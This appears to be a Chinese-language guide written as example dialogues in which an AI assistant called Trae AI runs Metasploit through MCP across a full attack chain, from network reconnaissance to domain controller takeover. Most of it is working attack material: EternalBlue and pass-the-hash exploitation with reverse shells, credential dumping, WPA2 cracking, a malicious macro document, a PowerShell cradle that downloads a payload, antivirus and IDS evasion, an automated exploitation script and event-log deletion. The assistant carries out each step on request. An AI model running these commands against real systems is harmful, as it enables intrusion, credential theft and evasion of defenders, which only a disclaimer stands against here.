# 綜合攻擊鏈範例 - Trae AI + Metasploit MCP

本文檔展示如何透過 Trae AI 執行完整的滲透測試攻擊鏈，從初始偵察到最終報告的全過程。

⚠️ **重要提醒：所有操作僅限於授權的滲透測試環境中使用**

## 攻擊鏈概述

### 滲透測試方法論

**用戶提問：**
```
解釋完整的滲透測試攻擊鏈流程
```

**Trae AI 回應的標準流程：**

1. **偵察 (Reconnaissance)**
2. **掃描 (Scanning)**
3. **枚舉 (Enumeration)**
4. **漏洞評估 (Vulnerability Assessment)**
5. **利用 (Exploitation)**
6. **後滲透 (Post-Exploitation)**
7. **權限提升 (Privilege Escalation)**
8. **橫向移動 (Lateral Movement)**
9. **持久化 (Persistence)**
10. **數據滲出 (Data Exfiltration)**
11. **痕跡清理 (Covering Tracks)**
12. **報告 (Reporting)**

## 場景一：企業內網滲透

### 目標環境
- **目標網段**：192.168.1.0/24
- **已知信息**：公司使用 Windows 域環境
- **測試目標**：獲取域管理員權限

### 階段 1：偵察和信息收集

**用戶提問：**
```
開始對目標企業網絡進行偵察
```

**Trae AI 執行流程：**
```
# 1. 主機發現
use auxiliary/scanner/discovery/arp_sweep
set RHOSTS 192.168.1.0/24
set THREADS 50
run

# 2. 端口掃描
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.10-50
set PORTS 21,22,23,25,53,80,110,135,139,443,445,993,995,1433,3389
set THREADS 20
run

# 3. 服務識別
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run
```

**發現結果：**
```
[+] 192.168.1.10 - Windows Server 2016 (SMB 3.1.1)
[+] 192.168.1.20 - Windows 10 Pro (SMB 3.0)
[+] 192.168.1.30 - Windows Server 2012 R2 (SMB 3.0)
[+] 192.168.1.40 - Windows 7 SP1 (SMB 2.1)
```

### 階段 2：漏洞掃描和評估

**用戶提問：**
```
對發現的主機進行漏洞掃描
```

**Trae AI 執行流程：**
```
# 1. SMB 漏洞掃描
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# 2. 檢查其他常見漏洞
use auxiliary/scanner/smb/smb_ms08_067
set RHOSTS 192.168.1.0/24
run

# 3. RDP 漏洞掃描
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS 192.168.1.0/24
run
```

**漏洞發現：**
```
[+] 192.168.1.40 - Host is likely VULNERABLE to MS17-010!
[+] 192.168.1.30 - Host is likely VULNERABLE to MS08-067!
```

### 階段 3：初始訪問

**用戶提問：**
```
利用發現的漏洞獲取初始訪問權限
```

**Trae AI 執行流程：**
```
# 1. 利用 MS17-010 攻擊 Windows 7 主機
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.40
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit

# 2. 驗證訪問權限
sessions -i 1
sysinfo
getuid
```

**成功結果：**
```
meterpreter > sysinfo
Computer        : WIN7-CLIENT
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : COMPANY
Logged On Users : 2
Meterpreter     : x64/windows

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### 階段 4：後滲透和信息收集

**用戶提問：**
```
收集目標系統和網絡的詳細信息
```

**Trae AI 執行流程：**
```
# 1. 系統信息枚舉
background
use post/windows/gather/enum_system
set SESSION 1
run

# 2. 網絡信息收集
use post/windows/gather/enum_network
set SESSION 1
run

# 3. 域信息枚舉
use post/windows/gather/enum_domain
set SESSION 1
run

# 4. 用戶和組枚舉
use post/windows/gather/enum_domain_users
set SESSION 1
run
```

**關鍵發現：**
```
[+] Domain: COMPANY.LOCAL
[+] Domain Controller: DC01.company.local (192.168.1.10)
[+] Domain Admins: administrator, john.doe, jane.smith
[+] Current user has local admin rights
```

### 階段 5：憑據收集

**用戶提問：**
```
從受害主機中提取憑據信息
```

**Trae AI 執行流程：**
```
# 1. 遷移到穩定進程
sessions -i 1
migrate -N explorer.exe

# 2. 提取系統憑據
use post/windows/gather/credentials/windows_autologin
set SESSION 1
run

# 3. 嘗試提取緩存的域憑據
use post/windows/gather/cachedump
set SESSION 1
run

# 4. 檢查瀏覽器保存的密碼
use post/windows/gather/enum_chrome
set SESSION 1
run
```

**憑據發現：**
```
[+] Found cached domain credentials:
    Username: john.doe
    Domain: COMPANY
    Hash: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

### 階段 6：橫向移動

**用戶提問：**
```
使用獲得的憑據攻擊其他系統
```

**Trae AI 執行流程：**
```
# 1. 使用 PSExec 橫向移動到服務器
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.30
set SMBUser john.doe
set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4445
exploit

# 2. 驗證新的訪問權限
sessions -i 2
sysinfo
getuid
```

**成功結果：**
```
meterpreter > sysinfo
Computer        : WIN2012-SRV
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : COMPANY
Logged On Users : 3
Meterpreter     : x86/windows

meterpreter > getuid
Server username: COMPANY\john.doe
```

### 階段 7：權限提升

**用戶提問：**
```
在新獲得的服務器上提升到系統權限
```

**Trae AI 執行流程：**
```
# 1. 檢查權限提升機會
background
use post/multi/recon/local_exploit_suggester
set SESSION 2
run

# 2. 嘗試權限提升
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 2
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4446
exploit
```

### 階段 8：域控制器攻擊

**用戶提問：**
```
嘗試攻擊域控制器獲取域管理員權限
```

**Trae AI 執行流程：**
```
# 1. 使用獲得的高權限憑據攻擊域控
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.10
set SMBUser administrator
set SMBPass [extracted_admin_hash]
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4447
exploit

# 2. 驗證域控訪問
sessions -i 4
sysinfo
getuid
```

**最終成功：**
```
meterpreter > sysinfo
Computer        : DC01
OS              : Windows Server 2016 (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : COMPANY
Logged On Users : 5
Meterpreter     : x64/windows

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## 場景二：Web 應用滲透

### 目標環境
- **目標**：https://webapp.company.com
- **應用類型**：Java Web 應用
- **測試目標**：獲取服務器控制權限

### 階段 1：Web 應用偵察

**用戶提問：**
```
對目標 Web 應用進行偵察和信息收集
```

**Trae AI 執行流程：**
```
# 1. HTTP 服務掃描
use auxiliary/scanner/http/http_version
set RHOSTS webapp.company.com
set RPORT 443
set SSL true
run

# 2. 目錄和文件枚舉
use auxiliary/scanner/http/dir_scanner
set RHOSTS webapp.company.com
set RPORT 443
set SSL true
set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
run

# 3. 技術棧識別
use auxiliary/scanner/http/http_header
set RHOSTS webapp.company.com
set RPORT 443
set SSL true
run
```

### 階段 2：漏洞掃描

**用戶提問：**
```
掃描 Web 應用的已知漏洞
```

**Trae AI 執行流程：**
```
# 1. Struts2 漏洞掃描
use auxiliary/scanner/http/struts2_code_exec_parameters
set RHOSTS webapp.company.com
set RPORT 443
set SSL true
set TARGETURI /app
run

# 2. SQL 注入檢測
use auxiliary/scanner/http/sql_injection
set RHOSTS webapp.company.com
set RPORT 443
set SSL true
run
```

### 階段 3：Web 應用利用

**用戶提問：**
```
利用發現的 Struts2 漏洞獲取服務器訪問權限
```

**Trae AI 執行流程：**
```
# 利用 Struts2 RCE 漏洞
use exploit/multi/http/struts2_rest_xstream
set RHOSTS webapp.company.com
set RPORT 443
set SSL true
set TARGETURI /app/orders
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4448
exploit
```

## 場景三：無線網絡滲透

### 目標環境
- **目標**：企業 WiFi 網絡
- **SSID**：COMPANY-WIFI
- **安全類型**：WPA2-Enterprise

### 階段 1：無線網絡偵察

**用戶提問：**
```
掃描和分析目標無線網絡
```

**Trae AI 建議的工具和流程：**
```
# 注意：這些操作需要在 Kali Linux 上執行
# Trae AI 可以指導但不能直接執行無線操作

# 1. 無線網絡掃描
airodump-ng wlan0mon

# 2. 目標網絡監控
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 3. 客戶端去認證攻擊
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### 階段 2：WPA2 破解

**用戶提問：**
```
破解捕獲的 WPA2 握手包
```

**Trae AI 指導流程：**
```
# 1. 使用 Metasploit 的字典攻擊
use auxiliary/analyze/crack_wifi
set HANDSHAKE_FILE /root/capture-01.cap
set DICT_FILE /usr/share/wordlists/rockyou.txt
run

# 2. 或使用 hashcat 進行 GPU 加速破解
hashcat -m 2500 capture.hccapx /usr/share/wordlists/rockyou.txt
```

## 高級攻擊技術

### 社會工程學攻擊

**用戶提問：**
```
結合社會工程學技術進行攻擊
```

**Trae AI 建議的方法：**
```
# 1. 生成惡意 Office 文檔
use exploit/multi/fileformat/office_word_macro
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4449
set FILENAME quarterly_report.docm
exploit

# 2. 設置監聽器
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4449
exploit
```

### 物理訪問攻擊

**用戶提問：**
```
利用物理訪問進行攻擊
```

**Trae AI 建議的技術：**
```
# 1. USB Rubber Ducky payload 生成
use payload/windows/exec
set CMD "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')\""
generate -f psh-cmd

# 2. 設置 Web 服務器提供 payload
use auxiliary/server/capture/http_basic
set URIPATH /payload.ps1
run
```

## 防禦規避技術

### 反病毒規避

**用戶提問：**
```
如何規避目標系統的反病毒軟件？
```

**Trae AI 建議的技術：**
```
# 1. 使用多重編碼
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# 2. 使用內存注入技術
use exploit/windows/local/payload_inject
set PAYLOAD windows/meterpreter/reverse_tcp
set PID [target_process_id]
exploit

# 3. 使用 PowerShell 無文件攻擊
use exploit/multi/script/web_delivery
set PAYLOAD windows/meterpreter/reverse_tcp
set TARGET 2
set LHOST 192.168.1.100
set LPORT 4444
exploit
```

### 網絡檢測規避

**用戶提問：**
```
如何規避網絡入侵檢測系統？
```

**Trae AI 建議的方法：**
```
# 1. 使用 HTTPS 加密通信
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 192.168.1.100
set LPORT 443

# 2. 使用域前置技術
set HttpHostHeader legitimate-site.com
set HttpServerName cdn.cloudflare.com

# 3. 流量混淆
set PrependMigrate true
set EXITFUNC thread
```

## 攻擊鏈自動化

### 自動化腳本

**用戶提問：**
```
創建自動化的攻擊鏈腳本
```

**Trae AI 提供的 Metasploit 資源腳本：**
```ruby
# auto_attack_chain.rc
# 自動化攻擊鏈資源腳本

# 階段 1: 網絡掃描
use auxiliary/scanner/discovery/arp_sweep
set RHOSTS 192.168.1.0/24
set THREADS 50
run

# 階段 2: 端口掃描
use auxiliary/scanner/portscan/tcp
set RHOSTS file:/tmp/live_hosts.txt
set PORTS 135,139,445
set THREADS 20
run

# 階段 3: SMB 漏洞掃描
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS file:/tmp/smb_hosts.txt
run

# 階段 4: 自動利用
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
set RHOSTS file:/tmp/vulnerable_hosts.txt
set AutoRunScript post/multi/manage/shell_to_meterpreter
exploit -z

# 階段 5: 後滲透
use post/multi/recon/local_exploit_suggester
set SESSION -1
run
```

### 使用自動化腳本

**用戶提問：**
```
如何執行自動化攻擊鏈？
```

**Trae AI 執行方法：**
```
# 在 Metasploit 中執行資源腳本
msfconsole -r auto_attack_chain.rc

# 或在 msfconsole 中加載
resource /path/to/auto_attack_chain.rc
```

## 報告和文檔

### 攻擊鏈報告生成

**用戶提問：**
```
生成完整的攻擊鏈報告
```

**Trae AI 建議的報告結構：**

#### 1. 執行摘要
- 測試範圍和目標
- 關鍵發現和風險評級
- 業務影響分析
- 修復建議優先級

#### 2. 攻擊路徑分析
```
初始訪問 → 權限提升 → 橫向移動 → 目標達成

192.168.1.40 (MS17-010) → 本地管理員 → 域憑據收集 → 域控制器訪問
```

#### 3. 技術細節
- 使用的工具和技術
- 漏洞詳細信息
- 利用過程截圖
- 獲得的訪問權限

#### 4. 風險評估
- CVSS 評分
- 業務風險等級
- 可能的攻擊場景
- 數據洩露風險

#### 5. 修復建議
- 立即修復項目
- 短期改進措施
- 長期安全策略
- 監控和檢測建議

### 證據保全

**用戶提問：**
```
如何正確保存攻擊鏈的證據？
```

**Trae AI 建議的證據管理：**
```
# 1. 創建證據目錄結構
mkdir -p /evidence/{logs,screenshots,files,network_captures}

# 2. 自動記錄 Metasploit 會話
set LogLevel 3
set SessionLogging true
set SessionLogDir /evidence/logs

# 3. 截圖和文件收集
# 在每個關鍵步驟執行截圖
screenshot
download sensitive_file.txt /evidence/files/

# 4. 網絡流量捕獲
# 使用 tcpdump 或 Wireshark 記錄網絡活動
tcpdump -i eth0 -w /evidence/network_captures/attack_traffic.pcap

# 5. 生成完整性校驗
find /evidence -type f -exec sha256sum {} \; > /evidence/checksums.txt
```

## 最佳實踐和注意事項

### 測試前準備

**用戶提問：**
```
執行攻擊鏈前需要做哪些準備？
```

**Trae AI 建議的準備清單：**

1. **授權確認**
   - 書面測試授權
   - 測試範圍明確
   - 緊急聯繫方式

2. **環境準備**
   - 測試工具更新
   - 網絡連接測試
   - 備份和恢復計劃

3. **安全措施**
   - 數據保護協議
   - 訪問控制設置
   - 日誌記錄配置

### 測試後清理

**用戶提問：**
```
攻擊鏈測試完成後如何進行清理？
```

**Trae AI 建議的清理步驟：**
```
# 1. 關閉所有 Meterpreter 會話
sessions -K

# 2. 清理目標系統上的文件
# 在每個受影響的系統上執行
del C:\\temp\\payload.exe
reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /f

# 3. 恢復系統配置
# 移除添加的用戶賬戶
net user testuser /delete

# 4. 清理日誌痕跡（如果需要）
use post/windows/manage/delete_logs
set SESSION [session_id]
run

# 5. 驗證清理完成
# 重新掃描確認沒有殘留
```

---

**重要提醒：**
- 所有攻擊鏈操作必須在授權範圍內進行
- 遵循負責任的漏洞披露原則
- 妥善保管測試過程中獲得的敏感信息
- 及時向客戶提供修復建議和支持
- 定期更新攻擊技術和防禦知識

**法律聲明：**
本文檔僅供教育和授權滲透測試使用。未經授權使用這些技術進行攻擊是違法行為。使用者必須遵守當地法律法規，並確保擁有適當的測試授權。